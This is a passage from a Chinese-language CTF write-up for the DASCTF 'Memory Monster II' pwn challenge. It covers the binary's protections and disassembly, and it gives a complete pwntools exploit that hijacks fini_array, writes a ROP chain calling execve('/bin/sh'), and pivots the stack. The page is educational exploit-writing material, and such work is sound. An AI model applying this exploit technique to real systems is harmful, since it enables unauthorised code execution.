+<p>题目来源 DASCTF 五月赛，作者为 TaQini ，<a href="[https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory%20Monster%20II](https://github.com/hebtuerror404/CTF_competition_warehouse_2020_First/tree/master/2020_DAS_SECURITY_CTF_MAY./Pwnable/Memory Monster II)">附件</a></p>
+<p>这里和上面那条机会一样，下面是独立完成，详细记录一下</p>
+</blockquote>
+<h3 id="_6">保护情况</h3>
+<p>checksec 检查是没有 canary 但是根据汇编去检查<strong>是有 canary 保护</strong>的：</p>
+<pre><code class="shell">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+
+<h3 id="_7">漏洞函数</h3>
+<p>题目编译的二进制文件没有符号表，可以尝试用 lscan 找到对应 sig 文件修复，没有卵用只修复了两个函数，但是能看到 _start 函数：（重命名部分函数）</p>
+<pre><code class="c">.text:0000000000401B00                 public start
+.text:0000000000401B00 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:0000000000401B00 ; __unwind {
+.text:0000000000401B00                 xor     ebp, ebp
+.text:0000000000401B02                 mov     r9, rdx
+.text:0000000000401B05                 pop     rsi
+.text:0000000000401B06                 mov     rdx, rsp
+.text:0000000000401B09                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:0000000000401B0D                 push    rax
+.text:0000000000401B0E                 push    rsp
+.text:0000000000401B0F                 mov     r8, offset __libc_start_fini
+.text:0000000000401B16                 mov     rcx, offset __libc_start_init
+.text:0000000000401B1D                 mov     rdi, offset main
+.text:0000000000401B24                 db      67h
+.text:0000000000401B24                 call    sub_4020B0
+.text:0000000000401B2A                 hlt
+.text:0000000000401B2A ; } // starts at 401B00
+.text:0000000000401B2A start           endp
+</code></pre>
+
+<p>依据规律知道三个 mov 依次是处理 __libc_start_fini、__libc_start_init、main 。从这里获取到关键参数： __libc_start_fini、main 地址。</p>
+<p>然后 gdb 调试，断点打在 __libc_start_fini ，一直运行到 call 指令，rbp 存储的值就是 fini_array[0] 的地址 0x4b80b0 ：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-07-07-Fao8iqPT0I2CQDVU.png" /></p>
+<p>leave_ret 和 ret 通过 ROPgadget 直接能查到；rax、rdi、rsi、rdx 传参 gadget 也能找到，这几个 gadget 找那种只穿一个寄存器的：<code>pop rax;ret</code>。</p>
+<h3 id="exp_1">exp</h3>
+<pre><code class="python">from pwn import *
+context.log_level = 'debug'
+
+p = process(&quot;./main&quot;)
+elf = ELF(&quot;./main&quot;)
+
+#hijack fini
+libc_csu_fini = 0x0402CB0
+main_addr = 0x0401C1D
+fini_array = 0x4b80b0
+esp = fini_array + 0x10
+leave_ret = 0x0401cf3
+ret = 0x0401016
+
+#execve('/bin/sh',0,0)
+rop_syscall = 0x46F745  
+rop_pop_rax = 0x0000000000448fcc
+rop_pop_rdx = 0x0000000000448415
+rop_pop_rsi = 0x0000000000406f80
+rop_pop_rdi = 0x0000000000401746
+bin_sh_addr = 0x492895
+
+def write(addr,data):
+    p.sendlineafter('addr:',p64(addr))
+    p.sendafter('data:',data)
+
+# hijack fini_array
+gdb.attach(p,'b *0x0402CB0')
+write(fini_array,p64(libc_csu_fini) + p64(main_addr))
+
+# rop chain
+write(esp,p64(rop_pop_rax))
+write(esp+8,p64(0x3b))
+write(esp+16,p64(rop_pop_rdi))
+write(esp+24,p64(bin_sh_addr))
+write(esp+32,p64(rop_pop_rdx))
+write(esp+40,p64(0))
+write(esp+48,p64(rop_pop_rsi))
+write(esp+56,p64(0))
+write(esp+64,p64(rop_syscall))
+
+# stack pivoting
+#gdb.attach(p)
+write(fini_array,p64(leave_ret) + p64(ret))
+p.interactive()
+</code></pre>
+
+<h2 id="_8">参考文章</h2>
+<ul>
+<li><a href="https://www.freebuf.com/articles/system/226003.html">详解64位静态编译程序的fini_array劫持及ROP攻击</a></li>
+</ul>
+                
+              
+              
+                
+
+
+  <h2 id="__comments">评论</h2>
+  <div id="disqus_thread"></div>
+  <script>var disqus_config=function(){this.page.url="https://wiki.mrskye.cn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/",this.page.identifier="stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/"};!function(){var e=document,i=e.createElement("script");i.src="//SkYe.disqus.com/embed.js",i.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(i)}()</script>
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2020 SkYe
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.d710d30a.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.5f27aba8.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\uff0c\\u3002]+", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ["tabs", "instant"],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.27c6a5e6.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
